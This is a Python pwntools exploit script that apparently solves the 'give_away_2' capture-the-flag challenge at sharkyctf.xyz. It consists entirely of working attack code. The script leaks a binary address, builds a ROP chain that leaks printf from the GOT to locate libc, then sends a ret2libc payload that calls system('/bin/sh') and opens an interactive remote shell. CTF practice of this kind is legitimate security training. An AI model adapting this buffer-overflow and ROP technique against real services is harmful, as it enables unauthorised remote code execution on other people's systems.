from pwn import *


import time
uu64    = lambda data               :u64(data.ljust(8, '\0'))

p =remote('sharkyctf.xyz', 20335)

#p= process('./give_away_2')


buf = 'A' * 32

leak = int(p.recvline()[11:],16)
vuln = leak - 35
printf_plt = leak - 468
printf_got = leak + 1884 + 2097152 
format_string = leak + 192
pop_rdi_ret = leak+159
pop_rsi_r15_ret = leak+157
ret = pop_rsi_r15_ret - 651
middle_main = leak+28




buf = p64(format_string)+ ('A' * 32)
log.info("leak: "+ hex(leak))
log.info("printf_got: "+hex(printf_got))
log.info("printf_plt: "+hex(printf_plt))
log.info("format_string: "+hex(format_string))
log.info("pop_rsi_r15_ret: "+hex(pop_rsi_r15_ret))
log.info("pop_rdi_ret: "+hex(pop_rdi_ret))
log.info("vuln: "+hex(vuln))

payload = ''
payload += buf
payload += p64(pop_rdi_ret)
payload += p64(printf_got)
payload += p64(middle_main)
payload += p64(vuln)

log.info("payload: "+str(len(payload)))
p.sendline(payload)


libc_printf = uu64(p.recv(6))
libc_system = libc_printf -0x15a40
libc_bin_sh = libc_printf + 0x14f01a


log.info("leak_printf: "+ hex(libc_printf))
log.info("leak_system: "+ hex(libc_system))
log.info("leak_bin_sh: "+ hex(libc_bin_sh))

buf2 ="B" * 40

payload2 =''
payload2 += buf2
payload2 += p64(pop_rdi_ret)
payload2 += p64(libc_bin_sh)
payload2 += p64(ret)
payload2 += p64(libc_system)

p.sendline(payload2)
p.interactive()


